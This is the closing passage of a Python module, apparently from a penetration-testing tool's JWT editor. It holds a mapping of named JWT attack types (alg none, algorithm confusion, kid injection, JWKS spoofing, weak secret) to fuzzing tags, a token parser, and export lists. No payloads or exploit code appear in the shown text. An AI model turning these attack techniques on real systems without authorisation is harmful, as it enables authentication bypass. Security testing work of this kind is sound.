        Returns:
            Fuzztag string.
        """
        tags = {
            AttackType.ALG_NONE: "{{jwt_none}}",
            AttackType.ALG_CONFUSION: "{{jwt_alg_confusion}}",
            AttackType.KID_INJECTION: "{{jwt_kid_injection}}",
            AttackType.JWKS_SPOOFING: "{{jwt_jwks_spoofing}}",
            AttackType.WEAK_SECRET: "{{jwt_weak_secret}}",
            AttackType.CLAIM_TAMPERING: "{{jwt_claim_tamper}}",
            AttackType.B64_CONFUSION: "{{jwt_b64_confusion}}",
            AttackType.NESTED_JWT: "{{jwt_nested}}",
        }
        return tags.get(attack_type, "{{jwt_custom}}")

    def _parse_token(
        self,
        token_str: str,
        source: str = "",
        request_id: str = "",
    ) -> Optional[JWTToken]:
        """Parse a JWT token string.

        Args:
            token_str: Raw JWT string.
            source: Token source.
            request_id: Source request ID.

        Returns:
            JWTToken, or None.
        """
        try:
            header, payload, signature = decode_jwt(token_str)
            return JWTToken(
                raw=token_str,
                header=header,
                payload=payload,
                signature=signature,
                source=source,
                source_request_id=request_id,
            )
        except Exception as e:
            logger.debug(f"Failed to parse JWT: {e}")
            return None

    def get_status(self) -> Dict[str, Any]:
        """Get editor status.

        Returns:
            Dictionary with status summary.
        """
        return {
            "loaded_tokens": len(self._loaded_tokens),
            "attack_count": len(self._attacker.get_attack_history()),
            "jwks": self._jwks_mgr.get_status(),
        }


# =============================================================================
# Global Singleton
# =============================================================================

_jwt_editor_manager: Optional[JWTEditorManager] = None


def get_jwt_editor_manager() -> JWTEditorManager:
    """Get the global JWTEditorManager singleton.

    Returns:
        Singleton JWTEditorManager instance.
    """
    global _jwt_editor_manager
    if _jwt_editor_manager is None:
        _jwt_editor_manager = JWTEditorManager()
    return _jwt_editor_manager


__all__ = [
    "JWTEditorManager",
    "JWTDetector",
    "JWTAttacker",
    "JWKSManager",
    "JWTHeader",
    "JWTPayload",
    "JWTToken",
    "AttackResult",
    "JWTAlgorithm",
    "AttackType",
    "Severity",
    "base64url_encode",
    "base64url_decode",
    "decode_jwt",
    "encode_jwt",
    "get_jwt_editor_manager",
]
